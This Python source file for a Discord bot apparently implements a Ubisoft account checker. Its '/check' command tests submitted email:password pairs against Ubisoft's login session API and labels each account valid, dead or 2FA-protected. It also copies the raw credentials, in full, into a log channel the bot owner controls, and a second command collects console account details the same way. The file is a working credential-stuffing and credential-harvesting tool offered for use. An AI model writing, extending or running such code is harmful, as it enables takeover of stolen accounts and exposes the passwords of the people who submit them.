import discord
from discord import app_commands
from discord.ext import commands
import aiohttp
import base64
import utils
import database as db

# Ubisoft's generic fallback App ID (works without the specific game ID)
UBI_APP_ID = "00000000-0000-0000-0000-000000000000"

class Checker(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def log_to_channel(self, interaction: discord.Interaction, embed: discord.Embed):
        log_channel_id = db.get_config("check_log_channel")
        if log_channel_id:
            try:
                channel = self.bot.get_channel(int(log_channel_id))
                if channel:
                    await channel.send(embed=embed)
            except Exception:
                pass

    @app_commands.command(name="check", description="Check if a Ubisoft email:pass account is valid.")
    @app_commands.describe(account="Format: email:password")
    async def check(self, interaction: discord.Interaction, account: str):
        await interaction.response.defer(ephemeral=True)
        
        if ":" not in account:
            return await interaction.followup.send("❌ Invalid format. Use `email:password`.", ephemeral=True)

        email, password = account.split(":", 1)
        b64_auth = base64.b64encode(f"{email}:{password}".encode('utf-8')).decode('utf-8')
        
        headers = {
            "Content-Type": "application/json",
            "Ubi-AppId": UBI_APP_ID,
            "Authorization": f"Basic {b64_auth}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }

        embed = discord.Embed(color=0x5865F2, title="🔍 Account Check", description=f"**User:** {interaction.user.mention}\n**Type:** Ubisoft Email:Pass\n**Input:** `{account}`")
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post("https://public-ubiservices.ubi.com/v3/profiles/sessions", headers=headers, json={"rememberMe": True}, timeout=5) as res:
                    if res.status == 200:
                        embed.color = 0x57F287
                        embed.add_field(name="Status", value="✅ Valid")
                        await interaction.followup.send("✅ Account is valid.", ephemeral=True)
                    elif res.status == 401:
                        embed.color = 0xED4245
                        embed.add_field(name="Status", value="❌ Invalid / 2FA")
                        await interaction.followup.send("❌ Account is dead or requires 2FA.", ephemeral=True)
                    else:
                        embed.color = 0xFEE75C
                        embed.add_field(name="Status", value=f"⚠️ Error {res.status}")
                        await interaction.followup.send(f"⚠️ Error: HTTP {res.status}", ephemeral=True)
        except Exception as e:
            embed.color = 0xED4245
            embed.add_field(name="Status", value=f"⚠️ Network Error")
            await interaction.followup.send(f"⚠️ Network error: {e}", ephemeral=True)

        await self.log_to_channel(interaction, embed)

    @app_commands.command(name="checkprelink", description="Submit a pre-linked console account (Xbox/PS).")
    @app_commands.describe(console="Xbox or PlayStation", details="Username or Email")
    async def checkprelink(self, interaction: discord.Interaction, console: str, details: str):
        await interaction.response.defer(ephemeral=True)
        
        # Playwright is dead. We just log the details to your channel.
        embed = discord.Embed(
            color=0x5865F2, 
            title="🎮 Pre-Linked Check",
            description=f"**User:** {interaction.user.mention}\n**Console:** {console.capitalize()}\n**Details:** `{details}`"
        )
        await interaction.followup.send("✅ Details submitted for manual review.", ephemeral=True)
        await self.log_to_channel(interaction, embed)

async def setup(bot):
    await bot.add_cog(Checker(bot))
